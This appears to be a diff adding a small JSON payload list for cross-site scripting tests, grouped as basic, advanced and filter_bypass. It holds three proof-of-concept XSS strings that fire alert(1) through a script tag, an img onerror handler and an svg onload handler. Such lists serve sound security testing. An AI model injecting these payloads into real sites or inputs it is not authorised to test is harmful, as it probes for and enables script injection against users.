@@ -1,0 +1,20 @@
+{
+  "basic": [
+    {
+      "payload": "<script>alert(1)</script>",
+      "description": "Basic XSS test"
+    }
+  ],
+  "advanced": [
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "description": "IMG tag XSS"
+    }
+  ],
+  "filter_bypass": [
+    {
+      "payload": "<svg/onload=alert(1)>",
+      "description": "SVG tag XSS"
+    }
+  ]
+} 
